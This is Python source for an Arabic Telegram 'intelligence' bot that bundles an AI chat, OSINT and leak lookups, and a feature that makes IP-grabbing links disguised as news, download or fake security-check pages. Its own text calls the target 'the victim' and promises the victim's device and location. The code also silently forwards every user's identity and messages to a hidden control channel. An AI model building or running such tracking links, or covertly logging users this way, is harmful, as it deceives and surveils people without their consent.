import os
import re
import json
import base64
import hashlib
import time
import requests
import threading
from datetime import datetime
from collections import defaultdict
from tracker_server import create_tracker_app, start_tracker_server

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⚙️  إعدادات النظام
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MAIN_BOT_TOKEN     = os.getenv("MAIN_BOT_TOKEN",    "")
TRACKER_BOT_TOKEN  = os.getenv("TRACKER_BOT_TOKEN", "")
ADMIN_ID           = int(os.getenv("ADMIN_ID",      "0"))
TARGET_CHANNEL_ID  = os.getenv("TARGET_CHANNEL_ID",  "")
CONTROL_CHANNEL_ID = os.getenv("CONTROL_CHANNEL_ID", "")

GROQ_API_KEY       = os.getenv("GROQ_API_KEY",      "")
TAVILY_API_KEY     = os.getenv("TAVILY_API_KEY",    "")
VIRUSTOTAL_API_KEY = os.getenv("VIRUSTOTAL_API_KEY", "")
LEAKCHECK_KEY      = os.getenv("LEAKCHECK_KEY",      "")
IPINFO_TOKEN       = os.getenv("IPINFO_TOKEN",       "")

BOT_SERVER_URL     = os.getenv("BOT_SERVER_URL",     "https://")

# ذاكرة مؤقتة للحالات {user_id: state}
pending_states = {}
# ذاكرة مؤقتة لروابط السحب {user_id: label}
pending_grabs  = {}
# ذاكرة المحادثة للذكاء الاصطناعي {user_id: [messages]}
chat_history   = defaultdict(list)
# سجلات روابط السحب {user_id: [logs]}
user_logs      = defaultdict(list)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  👥  قاعدة بيانات المستخدمين
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

USERS_FILE = "users_db.json"

def load_users() -> dict:
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def save_users(db: dict):
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(db, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def register_user(user):
    db = load_users()
    uid = str(user.id)
    if uid not in db:
        db[uid] = {
            "id":         user.id,
            "first_name": user.first_name or "",
            "username":   user.username or "",
            "joined":     datetime.now().strftime("%Y-%m-%d %H:%M"),
        }
        save_users(db)

def get_all_user_ids() -> list[int]:
    db = load_users()
    return [int(uid) for uid in db.keys()]

def get_users_count() -> int:
    return len(load_users())


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔔  الإشعارات والمراقبة
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _tg_post(token: str, chat_id: str, text: str, parse_mode: str = "Markdown"):
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text[:4096],
                "parse_mode": parse_mode,
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
        if r.status_code != 200:
            print(f"[CONTROL] ⚠️ فشل إرسال لـ {chat_id} — {r.status_code}: {r.text[:80]}")
        return r.status_code == 200
    except Exception as e:
        print(f"[CONTROL] ⚠️ استثناء: {e}")
        return False


def notify_control(user, action: str):
    """يُرسل نشاط المستخدم إلى قناة المراقبة"""
    uname = f"@{user.username}" if user.username else "لا يوجد"
    msg = (
        "👁 *راشد — نشاط مستخدم*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 الاسم  : {user.full_name}\n"
        f"🆔 ID     : `{user.id}`\n"
        f"📛 معرف   : {uname}\n"
        f"🕐 الوقت  : {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
        f"📌 الإجراء: {action}\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )
    sent = _tg_post(MAIN_BOT_TOKEN, CONTROL_CHANNEL_ID, msg)
    if not sent:
        _tg_post(TRACKER_BOT_TOKEN, CONTROL_CHANNEL_ID, msg)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🧠  الذكاء الاصطناعي | Groq AI + Tavily Search
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SYSTEM_PROMPT = (
    "أنت مساعد ذكاء اصطناعي اسمك «راشد»، صُنعت بواسطة راشد خليل أبو زيتونه.\n"
    "تحدث مع المستخدم بشكل طبيعي ومباشر وودي، كأنك صديق له.\n"
    "ابتعد عن الرسميات المبالغ فيها والردود الطويلة المملة.\n"
    "إذا قال لك 'مرحبا'، رد بـ 'أهلاً بك! كيف يمكنني مساعدتك اليوم؟' أو ما شابه، دون تعريف الكلمة أو ذكر مصادرها.\n"
    "أجب على قدر السؤال بوضوح واختصار مفيد.\n"
    "لا تستخدم عناوين أو نقاط إلا إذا كان الموضوع يتطلب ذلك فعلاً.\n"
    "اختم ردك بـ: ✦ راشد"
)

CODE_SYSTEM_PROMPT = (
    "أنت خبير برمجة متخصص اسمك «راشد»، صُنعت بواسطة راشد خليل أبو زيتونه.\n"
    "عند تحليل الأكواد البرمجية:\n"
    "1. اشرح ما يفعله الكود بشكل مفصّل.\n"
    "2. حدّد أي أخطاء أو مشاكل (Bugs) إن وجدت.\n"
    "3. اقترح تحسينات وممارسات أفضل (Best Practices).\n"
    "4. إذا كان فيه خطأ، اكتب الكود المصحّح.\n"
    "5. اشرح التعقيد الزمني (Time Complexity) إن كان ذا صلة.\n"
    "تحدث بالعربية بشكل واضح ومنظّم مع أمثلة.\n"
    "اختم كل رد بـ: ✦ راشد — راشد خليل أبو زيتونه"
)


def _wrap_ai_response(reply: str) -> str:
    """يُحسّن تنسيق رد الذكاء الاصطناعي ليبدو داخل بوكس احترافي"""
    header = (
        "```\n"
        "┌─────────────────────────────┐\n"
        "│   🤖  راشد الذكاء الاصطناعي  │\n"
        "└─────────────────────────────┘\n"
        "```\n"
    )
    return header + reply + "\n\n✦ راشد"


def ask_groq(user_id: int, prompt: str, use_internet: bool = True) -> str:
    if not GROQ_API_KEY:
        return "⛔ مفتاح Groq API غير متوفر."

    try:
        context_msgs = chat_history[user_id][-6:]
        messages = [{"role": "system", "content": SYSTEM_PROMPT}]
        messages.extend(context_msgs)
        
        final_prompt = prompt
        if use_internet and TAVILY_API_KEY:
            search_results = tavily_search(prompt)
            if search_results:
                final_prompt = f"المعلومات من الإنترنت:\n{search_results}\n\nسؤال المستخدم: {prompt}"

        messages.append({"role": "user", "content": final_prompt})

        r = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={"Authorization": f"Bearer {GROQ_API_KEY}"},
            json={
                "model": "llama-3.3-70b-versatile",
                "messages": messages,
                "temperature": 0.7,
                "max_tokens": 1024,
            },
            timeout=25,
        )
        if r.status_code == 200:
            reply = r.json()["choices"][0]["message"]["content"]
            chat_history[user_id].append({"role": "user", "content": prompt})
            chat_history[user_id].append({"role": "assistant", "content": reply})
            return reply
        else:
            return f"⚠️ خطأ في الذكاء الاصطناعي: {r.status_code}"
    except Exception as e:
        return f"❌ فشل الاتصال بالذكاء الاصطناعي: {e}"


def analyze_code(code: str) -> str:
    if not GROQ_API_KEY:
        return "⛔ مفتاح Groq API غير متوفر."
    try:
        r = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={"Authorization": f"Bearer {GROQ_API_KEY}"},
            json={
                "model": "llama-3.3-70b-versatile",
                "messages": [
                    {"role": "system", "content": CODE_SYSTEM_PROMPT},
                    {"role": "user", "content": f"حلل هذا الكود:\n\n{code}"}
                ],
                "temperature": 0.3,
            },
            timeout=30,
        )
        if r.status_code == 200:
            return r.json()["choices"][0]["message"]["content"]
        return f"⚠️ خطأ في تحليل الكود: {r.status_code}"
    except Exception as e:
        return f"❌ فشل تحليل الكود: {e}"


def analyze_image_groq(image_bytes: bytes, caption: str) -> str:
    if not GROQ_API_KEY:
        return "⛔ مفتاح Groq API غير متوفر."
    try:
        base64_image = base64.b64encode(image_bytes).decode('utf-8')
        r = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={"Authorization": f"Bearer {GROQ_API_KEY}"},
            json={
                "model": "llama-3.2-11b-vision-preview",
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": caption},
                            {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{base64_image}"}}
                        ]
                    }
                ],
            },
            timeout=30,
        )
        if r.status_code == 200:
            return r.json()["choices"][0]["message"]["content"]
        return f"⚠️ خطأ في تحليل الصورة: {r.status_code}"
    except Exception as e:
        return f"❌ فشل تحليل الصورة: {e}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🌐  أدوات الاستخبارات | OSINT Tools
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def tavily_search(query: str) -> str:
    if not TAVILY_API_KEY: return ""
    try:
        r = requests.post(
            "https://api.tavily.com/search",
            json={
                "api_key": TAVILY_API_KEY,
                "query": query,
                "search_depth": "advanced",
                "max_results": 5
            },
            timeout=15
        )
        if r.status_code == 200:
            results = r.json().get("results", [])
            return "\n".join([f"- {res['title']}: {res['content'][:200]}... ({res['url']})" for res in results])
    except:
        pass
    return ""


def analyze_ip(ip: str) -> str:
    try:
        # ipinfo.io
        r1 = requests.get(f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}", timeout=10)
        d1 = r1.json() if r1.status_code == 200 else {}
        
        # ip-api.com (Advanced)
        r2 = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,regionName,city,isp,org,as,asname,reverse,mobile,proxy,hosting,query", timeout=10)
        d2 = r2.json() if r2.status_code == 200 else {}

        if not d1 and not d2: return "❌ تعذر جلب بيانات الـ IP."

        res = (
            "```\n"
            "┌─────────────────────────┐\n"
            "│   🌐  تحليل عنوان IP    │\n"
            "└─────────────────────────┘\n"
            "```\n"
            f"📍 *IP:* `{ip}`\n"
            f"🏳️ *الدولة:* {d2.get('country', d1.get('country', 'N/A'))}\n"
            f"🏙️ *المدينة:* {d2.get('city', d1.get('city', 'N/A'))}\n"
            f"🏢 *المزود:* {d2.get('isp', d1.get('org', 'N/A'))}\n"
            f"🌐 *Hostname:* `{d2.get('reverse', d1.get('hostname', 'N/A'))}`\n"
            f"🔍 *النوع:* {'⚠️ VPN/Proxy' if d2.get('proxy') else ('🏢 Hosting' if d2.get('hosting') else '✅ حقيقي')}\n"
            f"📱 *هاتف:* {'نعم' if d2.get('mobile') else 'لا'}\n"
            f"🏛️ *ASN:* {d2.get('as', 'N/A')}\n"
            f"🗺️ *الإحداثيات:* `{d1.get('loc', 'N/A')}`\n"
            "\n━━━━━━━━━━━━━━━━━━━━━\n✦ راشد"
        )
        return res
    except Exception as e:
        return f"❌ خطأ في تحليل IP: {e}"


def cmd_osint_search(query: str) -> str:
    if not TAVILY_API_KEY: return "⛔ مفتاح Tavily غير متوفر."
    
    try:
        r = requests.post(
            "https://api.tavily.com/search",
            json={
                "api_key": TAVILY_API_KEY,
                "query": query,
                "search_depth": "advanced",
                "include_answer": True,
                "max_results": 5
            },
            timeout=20
        )
        if r.status_code != 200: return f"⚠️ خطأ في البحث: {r.status_code}"
        
        data = r.json()
        results = data.get("results", [])
        answer  = data.get("answer")
        
        report = (
            "```\n"
            "┌─────────────────────────┐\n"
            "│   📡  تقرير OSINT       │\n"
            "└─────────────────────────┘\n"
            "```\n"
            f"🔎 *الاستعلام:* `{query}`\n\n"
        )
        if answer:
            report += f"📌 *ملخص:*\n{answer[:500]}\n\n"
        report += "📂 *المصادر:*\n"
        for i, res in enumerate(results[:4], 1):
            title = res.get("title", "—")[:60]
            url   = res.get("url", "#")
            snip  = res.get("content", "")[:120]
            report += f"\n{i}▪ *{title}*\n   🔗 {url}\n   ↳ {snip}...\n"
        report += "\n━━━━━━━━━━━━━━━━━━━━━\n✦ راشد — راشد خليل أبو زيتونه"
        return report
    except Exception as e:
        return f"❌ فشل بحث OSINT: {e}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔗  توليد رابط سحب IP | Grab Link
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PAGE_TYPES = {
    "news":     "📰 صفحة إخبارية",
    "download": "📥 تحميل ملف",
    "bot":      "🤖 توجيه للبوت",
    "verify":   "🔒 تحقق أمني",
}


def generate_grab_link(user_id: int, label: str, page_type: str = "news") -> str:
    if not BOT_SERVER_URL or BOT_SERVER_URL == "https://":
        return "⛔ رابط الخادم غير مُهيّأ."
    session_id  = hashlib.sha256(f"{user_id}-{label}-{datetime.now()}".encode()).hexdigest()[:12]
    tracker_url = f"{BOT_SERVER_URL}/track/{user_id}/{session_id}/{page_type}"
    user_logs[user_id].append({
        "session_id": session_id,
        "url":        tracker_url,
        "label":      label,
        "page":       PAGE_TYPES.get(page_type, page_type),
        "timestamp":  datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    })
    return tracker_url


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🎨  الواجهة الرئيسية
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def build_main_keyboard(is_admin: bool = False) -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton("🤖 ذكاء اصطناعي",   callback_data="cb_ai"),
            InlineKeyboardButton("💻 تحليل كود",       callback_data="cb_code"),
        ],
        [
            InlineKeyboardButton("🛡️ فحص رابط",       callback_data="cb_scan"),
            InlineKeyboardButton("🌐 تحليل IP",        callback_data="cb_ip"),
        ],
        [
            InlineKeyboardButton("👤 بحث مستخدم",     callback_data="cb_user"),
            InlineKeyboardButton("🔍 بحث OSINT",       callback_data="cb_osint"),
        ],
        [
            InlineKeyboardButton("🕵️ رابط سحب IP",    callback_data="cb_grab"),
            InlineKeyboardButton("🔎 Whois نطاق",      callback_data="cb_whois"),
        ],
        [
            InlineKeyboardButton("📋 سجلاتي",          callback_data="cb_mylogs"),
            InlineKeyboardButton("🧹 مسح المحادثة",    callback_data="cb_clear"),
        ],
        [
            InlineKeyboardButton("📞 الدعم",            callback_data="cb_support"),
            InlineKeyboardButton("ℹ️ المساعدة",         callback_data="cb_help"),
        ],
    ]
    keyboard.insert(-1, [
        InlineKeyboardButton("🔍 فحص التسريبات",     callback_data="cb_leakcheck"),
    ])
    if is_admin:
        keyboard.insert(-1, [
            InlineKeyboardButton("🔬 VirusTotal",        callback_data="cb_vt"),
            InlineKeyboardButton("📊 الإحصائيات",       callback_data="cb_stats"),
        ])
    return InlineKeyboardMarkup(keyboard)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔘  معالجات الأوامر | Command Handlers
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    register_user(user)
    notify_control(user, "بدء الاستخدام")
    
    welcome = (
        "```\n"
        "┌─────────────────────────────┐\n"
        "│   🤖  راشد الاستخباراتي v2  │\n"
        "└─────────────────────────────┘\n"
        "```\n\n"
        "👋 أهلاً بك في نظام راشد الاستخباراتي المتقدم!\n\n"
        "🚀 *الميزات الرئيسية:*\n"
        "• 🤖 ذكاء اصطناعي متقدم متصل بالإنترنت\n"
        "• 🌐 بحث حي عبر الويب (Tavily)\n"
        "• 🔍 تحليل وفحص شامل\n"
        "• 📍 سحب بيانات IP والموقع الجغرافي\n"
        "• 🛡️ فحص الروابط والملفات\n"
        "• 💻 تحليل الأكواد البرمجية\n\n"
        "اختر من القائمة أدناه للبدء 👇"
    )
    
    await update.message.reply_text(
        welcome,
        parse_mode="Markdown",
        reply_markup=build_main_keyboard(user.id == ADMIN_ID)
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "```\n"
        "┌─────────────────────────┐\n"
        "│   📖  قائمة الأوامر     │\n"
        "└─────────────────────────┘\n"
        "```\n"
        "/start — تشغيل النظام\n"
        "/osint — بحث OSINT\n"
        "/user — بحث مستخدم\n"
        "/ip — تحليل IP\n"
        "/scan — فحص رابط\n"
        "/whois — فحص Whois\n"
        "/grab — رابط سحب IP\n"
        "/mylogs — سجلاتي\n"
        "/clear — مسح ذاكرة المحادثة\n"
        "/support — الدعم والتواصل\n"
        "/help — المساعدة"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")


async def cmd_grab(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not BOT_SERVER_URL:
        await update.message.reply_text("⛔ رابط الخادم غير مُهيّأ. تواصل مع المطوّر.")
        return
    
    label = " ".join(context.args) if context.args else "رابط عام"
    pending_grabs[user.id] = label
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📰 صفحة إخبارية", callback_data="cb_grab_news")],
        [InlineKeyboardButton("📥 تحميل ملف",   callback_data="cb_grab_download")],
        [InlineKeyboardButton("🤖 توجيه للبوت",  callback_data="cb_grab_bot")],
        [InlineKeyboardButton("🔒 تحقق أمني",   callback_data="cb_grab_verify")],
    ])
    await update.message.reply_text("🕵️ اختر نوع الصفحة التي سيراها الضحية:", reply_markup=kb)


async def cmd_mylogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    logs = user_logs.get(user.id, [])
    if not logs:
        await update.message.reply_text("📭 ليس لديك أي روابط نشطة حالياً.")
        return
    
    text = "📋 *سجلات روابطك النشطة:*\n\n"
    for i, log in enumerate(logs, 1):
        text += f"{i}▪ *{log['label']}*\n   🔗 `{log['url']}`\n   📅 {log['timestamp']}\n\n"
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_history[user.id] = []
    await update.message.reply_text("🧹 تم مسح ذاكرة المحادثة بنجاح.")


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    count = get_users_count()
    await update.message.reply_text(f"📊 *إحصائيات النظام:*\n\n👥 عدد المستخدمين: {count}", parse_mode="Markdown")


async def cmd_vt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = context.args[0] if context.args else ""
    if not url:
        await update.message.reply_text("🔬 يرجى إرسال الرابط للفحص: `/scan https://example.com`", parse_mode="Markdown")
        return
    
    if not VIRUSTOTAL_API_KEY:
        await update.message.reply_text("⛔ مفتاح VirusTotal غير متوفر.")
        return

    msg = await update.message.reply_text("🔬 جاري فحص الرابط عبر VirusTotal...")
    try:
        # 1. Submit URL
        r = requests.post(
            "https://www.virustotal.com/api/v3/urls",
            headers={"x-apikey": VIRUSTOTAL_API_KEY},
            data={"url": url},
            timeout=15
        )
        if r.status_code != 200:
            await msg.edit_text(f"⚠️ خطأ في VirusTotal: {r.status_code}")
            return
        
        analysis_id = r.json()["data"]["id"]
        
        # 2. Get Report (Wait a bit)
        time.sleep(2)
        r = requests.get(
            f"https://www.virustotal.com/api/v3/analyses/{analysis_id}",
            headers={"x-apikey": VIRUSTOTAL_API_KEY},
            timeout=15
        )
        if r.status_code == 200:
            stats = r.json()["data"]["attributes"]["stats"]
            res = (
                "```\n"
                "┌─────────────────────────┐\n"
                "│   🛡️  تقرير VirusTotal   │\n"
                "└─────────────────────────┘\n"
                "```\n"
                f"🔗 *الرابط:* `{url}`\n\n"
                f"✅ سليم: `{stats['harmless'] + stats['undetected']}`\n"
                f"⚠️ مشبوه: `{stats['suspicious']}`\n"
                f"❌ خبيث: `{stats['malicious']}`\n"
                f"🚫 فشل: `{stats['timeout']}`\n"
                "\n━━━━━━━━━━━━━━━━━━━━━\n✦ راشد"
            )
            await msg.edit_text(res, parse_mode="Markdown")
        else:
            await msg.edit_text("⚠️ تعذر جلب التقرير حالياً.")
    except Exception as e:
        await msg.edit_text(f"❌ خطأ: {e}")


async def cmd_leakcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = context.args[0] if context.args else ""
    if not query:
        await update.message.reply_text("🔍 يرجى إرسال البريد أو الرقم للفحص: `/leakcheck email@example.com`", parse_mode="Markdown")
        return
    
    if not LEAKCHECK_KEY:
        await update.message.reply_text("⛔ مفتاح LeakCheck غير متوفر.")
        return

    msg = await update.message.reply_text("🔍 جاري فحص التسريبات...")
    try:
        r = requests.get(
            f"https://leakcheck.io/api/v2/query/{query}?key={LEAKCHECK_KEY}",
            timeout=15
        )
        if r.status_code == 200:
            data = r.json()
            if data.get("success") and data.get("found", 0) > 0:
                sources = data.get("sources", [])
                res = (
                    "```\n"
                    "┌─────────────────────────┐\n"
                    "│   🔍  نتائج التسريبات   │\n"
                    "└─────────────────────────┘\n"
                    "```\n"
                    f"📧 *الهدف:* `{query}`\n"
                    f"⚠️ *عدد التسريبات:* `{data['found']}`\n\n"
                    "*أبرز المصادر:*\n"
                )
                for s in sources[:5]:
                    res += f"• {s.get('name', 'غير معروف')} ({s.get('date', 'N/A')})\n"
                res += "\n━━━━━━━━━━━━━━━━━━━━━\n✦ راشد"
                await msg.edit_text(res, parse_mode="Markdown")
            else:
                await msg.edit_text("✅ لم يتم العثور على تسريبات لهذا الهدف.")
        else:
            await msg.edit_text(f"⚠️ خطأ في LeakCheck: {r.status_code}")
    except Exception as e:
        await msg.edit_text(f"❌ خطأ: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔘  معالجات الأزرار والرسائل
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SUPPORT_INFO = (
    "```\n"
    "┌─────────────────────────┐\n"
    "│   📞  الدعم والتواصل    │\n"
    "└─────────────────────────┘\n"
    "```\n"
    "إذا واجهت أي مشكلة أو لديك استفسار، يمكنك التواصل مع المطور مباشرة عبر الواتساب.\n\n"
    "👤 *المطور:* راشد خليل أبو زيتونه\n"
    "📱 *واتساب:* +962775866283\n\n"
    "✦ راشد"
)

BUTTON_RESPONSES = {
    "cb_ai": (
        "```\n"
        "┌─────────────────────────┐\n"
        "│   🤖  الذكاء الاصطناعي  │\n"
        "└─────────────────────────┘\n"
        "```\n"
        "أنا الآن في وضع الاستعداد. أرسل أي سؤال أو موضوع وسأجيبك فوراً مع البحث في الإنترنت إذا لزم الأمر."
    ),
    "cb_code": (
        "```\n"
        "┌─────────────────────────┐\n"
        "│   💻  تحليل الكود        │\n"
        "└─────────────────────────┘\n"
        "```\n"
        "أرسل الكود مباشرةً وسأقوم بـ:\n"
        "› شرح ما يفعله الكود\n"
        "› كشف الأخطاء والمشاكل\n"
        "› اقتراح تحسينات\n"
        "› كتابة الكود المصحّح"
    ),
    "cb_osint": (
        "```\n"
        "┌─────────────────────────┐\n"
        "│   🔍  بحث OSINT         │\n"
        "└─────────────────────────┘\n"
        "```\n"
        "الأمر: /osint\n\n"
        "أو أرسل مباشرةً:\n`/osint اسم شخص أو موضوع`\n\n"
        "يجمع معلومات من مصادر متعددة على الإنترنت."
    ),
    "cb_help": None,
    "cb_support": None,
}


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user  = query.from_user
    await query.answer()
    data  = query.data

    back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")]])

    if data == "cb_support":
        support_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("💬 واتساب", url="https://wa.me/962775866283")],
            [InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")],
        ])
        await query.edit_message_text(SUPPORT_INFO, parse_mode="Markdown", reply_markup=support_kb)
        return

    if data == "cb_help":
        is_admin = user.id == ADMIN_ID
        text = (
            "```\n"
            "┌─────────────────────────┐\n"
            "│   📖  قائمة الأوامر     │\n"
            "└─────────────────────────┘\n"
            "```\n"
            "/start — تشغيل النظام\n"
            "/osint — بحث OSINT\n"
            "/user — بحث مستخدم\n"
            "/ip — تحليل IP\n"
            "/scan — فحص رابط\n"
            "/whois — فحص Whois\n"
            "/grab — رابط سحب IP\n"
            "/mylogs — سجلاتي\n"
            "/clear — مسح ذاكرة المحادثة\n"
            "/support — الدعم والتواصل\n"
            "/help — المساعدة"
        )
        if is_admin:
            text += "\n\n*أوامر المدير:*\n/stats — الإحصائيات\n/vt — VirusTotal"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_kb)
        return

    if data == "cb_back":
        await query.edit_message_text(
            "اختر من القائمة أدناه 👇",
            reply_markup=build_main_keyboard(user.id == ADMIN_ID)
        )
        return

    if data.startswith("cb_grab_"):
        page_type = data.replace("cb_grab_", "")
        label = pending_grabs.get(user.id, "رابط عام")
        url = generate_grab_link(user.id, label, page_type)
        msg = (
            f"✅ *تم إنشاء الرابط بنجاح!*\n\n"
            f"🔗 الرابط:\n`{url}`\n\n"
            f"📝 التفاصيل:\n"
            f"• النوع: {PAGE_TYPES.get(page_type, page_type)}\n"
            f"• التسمية: {label}\n\n"
            f"⚠️ عند ضغط أي شخص على الرابط:\n"
            f"ستصلك تفاصيل كاملة عن جهازه وموقعه!"
        )
        await query.edit_message_text(msg, parse_mode="Markdown")
        pending_grabs.pop(user.id, None)
        return

    response = BUTTON_RESPONSES.get(data)
    if response:
        if data == "cb_ai":
            pending_states[user.id] = "ai"
        elif data == "cb_code":
            pending_states[user.id] = "code"
        elif data == "cb_osint":
            pending_states[user.id] = "osint"
        elif data == "cb_scan":
            pending_states[user.id] = "vt"
            await query.edit_message_text("🔬 أرسل الرابط الذي تريد فحصه أمنياً:", reply_markup=back_kb)
            return
        elif data == "cb_ip":
            pending_states[user.id] = "ip_state"
            await query.edit_message_text("🌐 أرسل عنوان الـ IP لتحليله:", reply_markup=back_kb)
            return
        elif data == "cb_user":
            pending_states[user.id] = "osint"
            await query.edit_message_text("👤 أرسل اسم المستخدم أو الشخص للبحث عنه:", reply_markup=back_kb)
            return
        elif data == "cb_whois":
            pending_states[user.id] = "osint"
            await query.edit_message_text("🔎 أرسل النطاق (Domain) لفحص الـ Whois:", reply_markup=back_kb)
            return
        elif data == "cb_leakcheck":
            pending_states[user.id] = "leakcheck"
            await query.edit_message_text("🔍 أرسل البريد أو الرقم لفحص التسريبات:", reply_markup=back_kb)
            return
        
        await query.edit_message_text(response, parse_mode="Markdown", reply_markup=back_kb)


def is_code_block(text: str) -> bool:
    return "```" in text or text.strip().startswith("def ") or text.strip().startswith("class ")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_msg = update.message.text or ""

    register_user(user)

    state = pending_states.get(user.id)

    if state == "ai":
        if user.id != ADMIN_ID:
            notify_control(user, f"سؤال AI: {user_msg[:50]}")
        typing_msg = await update.message.reply_text("⏳ جاري المعالجة...")
        reply = ask_groq(user.id, user_msg, use_internet=True)
        await typing_msg.delete()
        await update.message.reply_text(reply, parse_mode="Markdown")
        return

    if state == "code":
        if user.id != ADMIN_ID:
            notify_control(user, f"تحليل كود: {user_msg[:50]}")
        typing_msg = await update.message.reply_text("💻 جاري تحليل الكود...")
        result = analyze_code(user_msg)
        await typing_msg.edit_text(result, parse_mode="Markdown")
        return

    if state == "osint":
        if user.id != ADMIN_ID:
            notify_control(user, f"بحث OSINT: {user_msg[:50]}")
        typing_msg = await update.message.reply_text("🔍 جاري البحث...")
        result = cmd_osint_search(user_msg.strip())
        await typing_msg.edit_text(result, parse_mode="Markdown", disable_web_page_preview=True)
        pending_states.pop(user.id, None)
        return

    if state == "ip_state":
        typing_msg = await update.message.reply_text("🌐 جاري تحليل الـ IP...")
        result = analyze_ip(user_msg.strip())
        await typing_msg.edit_text(result, parse_mode="Markdown")
        pending_states.pop(user.id, None)
        return

    if state == "leakcheck":
        context.args = [user_msg]
        pending_states.pop(user.id, None)
        await cmd_leakcheck(update, context)
        return

    if state == "vt":
        context.args = [user_msg]
        pending_states.pop(user.id, None)
        await cmd_vt(update, context)
        return

    if user.id != ADMIN_ID:
        notify_control(user, f"رسالة: {user_msg[:80]}")

    typing_msg = await update.message.reply_text("⏳ جاري المعالجة...")

    if is_code_block(user_msg):
        reply = analyze_code(user_msg)
    else:
        reply = ask_groq(user.id, user_msg, use_internet=True)

    await typing_msg.delete()
    await update.message.reply_text(reply, parse_mode="Markdown")


async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user    = update.effective_user
    caption = update.message.caption or "صف ما تراه في الصورة بالتفصيل"
    msg     = await update.message.reply_text("🖼️ جاري تحليل الصورة...")
    photo   = update.message.photo[-1]
    file    = await context.bot.get_file(photo.file_id)
    img_bytes = bytes(await file.download_as_bytearray())
    result  = analyze_image_groq(img_bytes, caption)
    await msg.edit_text(result, parse_mode="Markdown")
    if user.id != ADMIN_ID:
        notify_control(user, "أرسل صورة للتحليل")


